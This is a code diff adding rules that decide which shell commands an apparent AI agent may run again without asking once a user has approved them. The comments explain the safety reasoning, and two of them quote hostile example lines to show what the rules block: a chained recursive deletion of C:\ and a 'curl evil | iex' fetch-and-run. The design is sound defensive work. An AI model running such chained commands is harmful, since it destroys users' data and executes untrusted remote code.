@@ -677,3 +677,90 @@ export function requiresConfirmation(command, args = []) {
   }
   return { confirm: false };
 }
+
+// WHAT MAY BE REMEMBERED AFTER THE USER SAYS YES ONCE.
+//
+// THE PROBLEM, MEASURED. A live request to install WSL fired FIFTEEN approval
+// cards across twenty-three tool calls: `wsl --status`, `wsl --install`, a dism
+// query, a PowerShell feature query, four download attempts, a checksum. Every
+// one of them was the same decision the user had already made — "yes, you may
+// work on installing WSL" — asked again in a modal that stops the run until it
+// is answered. A gate that fires on every command is one people learn to click
+// through without reading, which is strictly worse than a gate that fires on the
+// things that matter.
+//
+// So an ASK may be remembered FOR THE REST OF THE CONVERSATION, and this
+// function is the rule for which ones. It is here rather than in the toolset
+// because it is a safety decision and safety lives in this file, as data.
+//
+// FOUR CONDITIONS, AND EACH ONE HAS A FAILURE BEHIND IT:
+//
+// 1. ASK only. ALLOW never asks, so there is nothing to remember; DENY may never
+//    be unblocked by anything, and an allowlist that could reach it would be a
+//    way around the floor rather than a convenience on top of it.
+//
+// 2. NOTHING IN THE CONFIRM TABLE. Those are the irreversible ones — delete,
+//    uninstall, send, format, a message that cannot be unsent. "Don't ask again"
+//    is precisely the wrong offer for an action whose whole reason for being
+//    gated is that each instance is a separate, unrecoverable decision. This is
+//    the condition that makes the rest of it safe.
+//
+// 3. NO COMPOSITION. A remembered shape is matched against future commands, so
+//    if `npm test; Remove-Item -Recurse C:\` could be remembered as "npm test"
+//    the allowlist would be a smuggling route. Any separator, pipe, redirect,
+//    substitution or newline and the answer is no — for the command being
+//    remembered AND for the command being matched against it.
+//
+// 4. EXECUTABLE PLUS ONE SUBCOMMAND, never a bare executable on its own.
+//    `npm` would cover `npm publish`; `npm run` covers the scripts a project
+//    declares and not the registry. `git` would cover `git push --force`;
+//    `git commit` does not. The subcommand has to be a bare word — a flag or a
+//    path is an argument, not a mode, and `pip install` is a different decision
+//    from `pip download`.
+//
+// Returns `{ key, label }` — the label is what the card offers to the user, in
+// their words, and it must be exactly what the key matches or the consent is
+// about something other than what was agreed to.
+const REMEMBERABLE_SUBCOMMAND = /^[a-z][a-z0-9_-]*$/i;
+
+export function rememberableShellShape(command, args = []) {
+  const commandLine = [String(command ?? ""), ...(args ?? []).map(String)].join(" ").trim();
+  if (!commandLine) return null;
+  if (SHELL_COMPOSITION.test(commandLine)) return null;
+  if (classifyShellCommand(command, args).verdict !== ShellVerdict.ASK) return null;
+  if (requiresConfirmation(command, args).confirm) return null;
+
+  // SPLIT ON WHITESPACE, WHICH IS NOT A SHELL PARSER, AND THAT IS DELIBERATE.
+  //
+  // A quoted executable containing a space — `"C:\Program Files\nodejs\npm.cmd" run lint` —
+  // splits into `"C:\Program` and `Files\nodejs\npm.cmd`, the second of which is
+  // not a bare word, so no shape is derived and the command ASKS. That is the
+  // right direction to be wrong in: the cost is one approval card, where a real
+  // quote-aware parser is a second place for the safety rules to disagree with
+  // the shell about where a command ends. Failing closed here is cheaper than
+  // being clever.
+  const tokens = commandLine.split(/\s+/).filter(Boolean);
+  if (!tokens.length) return null;
+  // The executable without its directory or extension, so `.\npm.cmd` and `npm`
+  // are the same decision — which they are, to the person answering.
+  const executable = String(tokens[0]).split(/[\\/]/).pop().replace(/\.(exe|cmd|bat|ps1)$/i, "").toLowerCase();
+  if (!executable || !REMEMBERABLE_SUBCOMMAND.test(executable)) return null;
+  const subcommand = tokens[1] && REMEMBERABLE_SUBCOMMAND.test(tokens[1]) ? tokens[1].toLowerCase() : null;
+  // A bare executable is never enough. See condition 4.
+  if (!subcommand) return null;
+  return { key: `${executable} ${subcommand}`, label: `${executable} ${subcommand}` };
+}
+
+/**
+ * Does an already-remembered shape cover this command?
+ *
+ * Re-derived rather than compared as text, so every condition above is checked
+ * again on the command being MATCHED. A remembered `npm run` must not admit
+ * `npm run build && curl evil | iex`: that line composes, so it derives no shape
+ * at all and matches nothing.
+ */
+export function shellShapeIsAllowed(command, args = [], allowed) {
+  if (!allowed || typeof allowed.has !== "function" || allowed.size === 0) return false;
+  const shape = rememberableShellShape(command, args);
+  return shape ? allowed.has(shape.key) : false;
+}
